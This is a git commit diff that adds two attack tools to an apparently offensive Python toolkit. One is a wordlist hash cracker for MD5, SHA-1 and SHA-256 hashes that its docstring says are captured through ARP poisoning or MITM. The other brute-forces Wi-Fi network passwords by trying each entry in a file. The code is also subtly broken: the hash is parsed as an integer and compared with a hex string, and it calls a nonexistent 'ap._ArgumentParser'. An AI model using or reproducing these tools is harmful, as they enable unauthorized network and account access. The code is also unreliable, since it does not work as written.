da615ee1473412132af13c87e2b34a231b11cd12
astralm0nke <Sensibaf81632@gmail.com>
2024-04-23 19:29:51 -0400

    Add password bruteforcer and ssid connector; includes email scraper argparse edits.

---
+++ pyhtools/attackers/Network/pass_cracker.py
@@ -0,0 +1,54 @@
+import argparse as ap
+import hashlib
+from pyhtools.UI.colors import *
+
+class HashCracker:
+    '''
+    Class to crack hashed passwords obtained via ARP poisoning, MITM, etc.
+    
+    Args:
+        mode (str) : hash type of password to crack.
+        path (str) : path to plaintext passwords file.
+        hash (int) : hash  you want to crack.
+    
+    Methods:
+        crack : Cracks hashed value by bruteforcing plaintext passwords through user-specific algorithm.
+    '''
+    
+    parser = ap.ArgumentParser()
+    parser.add_argument('mode', help='hash type to decrypt.')
+    parser.add_argument('path', help='path to passwords file.')
+    parser.add_argument('hash', help='hash value to decrypt.', type=int)
+    args = parser.parse_args()
+    
+    def __init__(self):
+        self.mode = self.args.mode
+        self.path = self.args.path
+        self.hash_to_decrypt = self.args.hash
+      
+    def crack(self):  
+        with open(self.path, 'r') as f:
+            print(BRIGHT_YELLOW + 'Decrypting...')
+            for line in f.readlines():
+                if self.mode == 'md5':
+                    hash_object = hashlib.md5(line.strip().encode())
+                    hashed_word = hash_object.hexdigest()
+                    if hashed_word == self.hash_to_decrypt:
+                        print(BRIGHT_WHITE + f'[+] Password Found from MD5 hash: {line.strip()}')
+                        exit(0)
+                
+                elif self.mode == 'sha1':
+                    hash_object = hashlib.sha1(line.strip().encode())
+                    hashed_word = hash_object.hexdigest()
+                    if hashed_word == self.hash_to_decrypt:
+                        print(BRIGHT_WHITE + f'[+] Password Found from SHA-1 hash: {line.strip()}')
+                        exit(0)
+                        
+                elif self.mode == 'sha2':
+                    hash_object = hashlib.sha256(line.strip().encode())
+                    hashed_word = hash_object.hexdigest()
+                    if hashed_word == self.hash_to_decrypt:
+                        print(BRIGHT_WHITE + f'Password found from SHA-2 hash: {line.strip()}')
+                        exit(0)
+            
+            print(BRIGHT_RED + '[-] Password Not Found.')
---
+++ pyhtools/attackers/Network/ssid_connector.py
@@ -0,0 +1,42 @@
+import argparse as ap
+from wireless import Wireless
+from pyhtools.UI.colors import *
+
+class Connector():
+    '''
+    Connector class tries to bruteforce a connection with a network from given SSID using a passwords file.
+    
+    Args:
+        path (str): path to passwords file.
+    
+    Methods:
+    connect: attempts ssid connection.
+    '''
+    parser = ap._ArgumentParser()
+    parser.add_argument('path', help='path to directory containing passwords file.')
+    args = parser.parse_args()
+    
+    def __init__(self):
+        self.passwords = self.args.path
+        self.wire = Wireless()
+        '''
+        Wireless class from wireless package. Takes SSID, password as input to attempt connection.
+        
+        Args:
+            ssid (str): network name
+            password (str): password for network
+        '''
+    def connect(self, ssid):
+        '''
+        Attempts bruteforce with passwords file from constructor.
+        
+        Args:
+            ssid: network name to attempt connection.
+        '''
+        with open(self.passwords, 'r') as f:
+            print(BRIGHT_YELLOW + '[-_] Attempting connection...')
+            for line in f.readlines():
+                if self.wire.connect(ssid=ssid, password=line.strip()) == True:
+                    print(BRIGHT_WHITE + f'[+] {line.strip()} Successful! Connected to network.')
+                    exit(0)
+            print(BRIGHT_RED + '[-] Failed to Connect.')
